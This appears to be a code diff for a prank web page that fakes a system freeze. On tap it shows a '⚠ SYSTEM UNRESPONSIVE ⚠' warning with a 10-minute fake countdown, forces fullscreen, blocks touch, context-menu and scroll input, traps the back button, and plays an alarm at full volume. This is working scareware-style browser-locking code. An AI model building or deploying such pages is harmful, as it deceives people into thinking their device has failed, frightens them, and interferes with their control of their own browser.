@@ -34,13 +34,16 @@
     }
   </style>
 </head>
-<body onclick="goFullScreen()">
+<body onclick="startPrank()" ontouchstart="startPrank()">
   <div id="freezeText">
     ⚠ SYSTEM UNRESPONSIVE ⚠<br><span id="timer">Please wait...</span>
   </div>
 
+  <audio id="alarm" preload="auto">
+    <source src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" type="audio/mpeg">
+  </audio>
+
   <script>
-    // Fullscreen
     function goFullScreen() {
       const el = document.documentElement;
       if (el.requestFullscreen) el.requestFullscreen();
@@ -48,8 +51,7 @@
       else if (el.msRequestFullscreen) el.msRequestFullscreen();
     }
 
-    // Block all input events
-    function blockAllInputs() {
+    function blockInputs() {
       const prevent = (e) => e.preventDefault();
       document.addEventListener('contextmenu', prevent);
       document.addEventListener('touchstart', prevent, { passive: false });
@@ -59,10 +61,9 @@
       document.addEventListener('scroll', () => window.scrollTo(0, 0));
     }
 
-    // Fake 10-min timer
-    function startFreezeTimer() {
+    function startTimer() {
       const timerEl = document.getElementById('timer');
-      let secondsLeft = 600; // 10 minutes
+      let secondsLeft = 600;
       const interval = setInterval(() => {
         const mins = Math.floor(secondsLeft / 60);
         const secs = secondsLeft % 60;
@@ -75,7 +76,6 @@
       }, 1000);
     }
 
-    // Block Android back button using history push
     function blockBackButton() {
       history.pushState(null, null, location.href);
       window.onpopstate = function () {
@@ -83,11 +83,19 @@
       };
     }
 
-    // Start prank
-    goFullScreen();
-    blockAllInputs();
-    startFreezeTimer();
-    blockBackButton();
+    function startSound() {
+      const audio = document.getElementById('alarm');
+      audio.volume = 1.0; // Full volume
+      audio.play().catch(e => console.log("Playback error: ", e));
+    }
+
+    function startPrank() {
+      goFullScreen();
+      blockInputs();
+      startTimer();
+      blockBackButton();
+      startSound();
+    }
   </script>
 </body>
 </html>
